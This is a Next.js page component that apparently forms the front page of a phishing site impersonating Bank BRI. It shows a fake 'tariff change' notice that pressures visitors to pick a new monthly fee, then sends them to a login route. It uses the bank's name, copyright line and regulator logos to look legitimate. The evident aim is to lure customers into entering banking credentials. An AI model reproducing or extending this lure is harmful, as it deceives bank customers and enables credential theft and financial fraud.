
import Image from 'next/image'
import banner from "../public/img-1.jpeg"
import banner2 from "../public/img-2.jpeg"
import logo from "../public/logo.jpg"
import ojk from "../public/ojk.png"
import lps from "../public/lps.png"

import { Swiper, SwiperSlide } from 'swiper/react';
// Import Swiper styles
import 'swiper/css';
import 'swiper/css/pagination';
import { Pagination } from 'swiper'
import { useRouter } from 'next/router'

export default function Home() {

	const router = useRouter()

	const handleSubmit = (e) => {
		e.preventDefault()
		router.push('/login')
	}

  return (
    	<div className="container">
            <div className='container-flex'>
                <div style={{margin:'0 5px'}}>
                    <Image src={logo} height={50} width={200} alt="logo" />              
                </div>
                <div style={{marginTop:'-30px'}}>
					<Swiper
						modules={[Pagination]}
						pagination={{ clickable: true }}
						slidesPerView={1}
						autoplay={true}
					>
						<SwiperSlide><Image src={banner} height={400} alt="logo2" /></SwiperSlide>
						<SwiperSlide><Image src={banner2} height={400} alt="logo3" /></SwiperSlide>
					</Swiper>            
                </div>
                  	<p style={{width:'90%',  margin:'0 auto', textAlign:'center', color:'rgb(14 120 202)', fontWeight:'bolder', fontSize:18}}>
						PERUBAHAN TARIF <br />
						BANK BRI Update Terbaru <br />
						Tarif Transaksi
					</p>
					<h6  style={{width:'90%',  margin:'10px auto 0 auto', textAlign:'center', fontSize:18}}><u>TARIF TRANSAKSI</u></h6>
                  <div style={{margin:'20px'}}>
                      <form onSubmit={handleSubmit}>
                          <label htmlFor='tarif' style={{fontWeight:'bolder', fontSize:16}}>Silahkan Pilih tarif transaksi <br/> anda:</label>
						  <br/>
						  <input type="radio" value="1" id='baru' name='baru' />
						  <label htmlFor='baru' style={{color:'rgb(14 120 202)', fontSize:14, fontWeight:'bold'}}>TARIF BARU Rp150.000 / Bulan</label>
						  <br/>
						  <input type="radio" value="2" id='lama' name='lama' />
						  <label htmlFor='lama' style={{color:'rgb(14 120 202)', fontSize:14, fontWeight:'bold'}}>TARIF LAMA Rp6.500 / Transaksi</label>
						  <h6 style={{width:'90%',  margin:'60px auto 0 auto', textAlign:'center', color:'rgb(14 120 202)', fontWeight:'bolder', fontSize:12}}>
						  	BANK BRI Update Terbaru 
							Tarif <br /> Transaksi
						  </h6>
                          <button type='submit' className='btn' id='btn' style={{cursor:'pointer', fontWeight:'normal', wordSpacing:2, borderRadius:4}}>
                              Lanjut
                          </button>
						  
                      </form>
                  </div>
				  	<span style={{textAlign:'center', fontSize:14, marginTop:'-25px'}}>
						Terdaftar dan diawasi oleh:
					</span>
					<div style={{margin:'0 auto', display:'flex'}}>
						<Image src={lps} width={100} height={50} alt="logo" />             
						<Image src={ojk} width={100} height={50} alt="logo" />             
					</div>
					<div style={{margin:'0 auto', display:'flex', backgroundColor:'rgb(14 120 202)', textAlign:'center', fontWeight:'lighter', color:'white'}}>
						<h6>Copyright © 2022 PT. Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</h6>
					</div>
            </div>
        </div>
  )
}
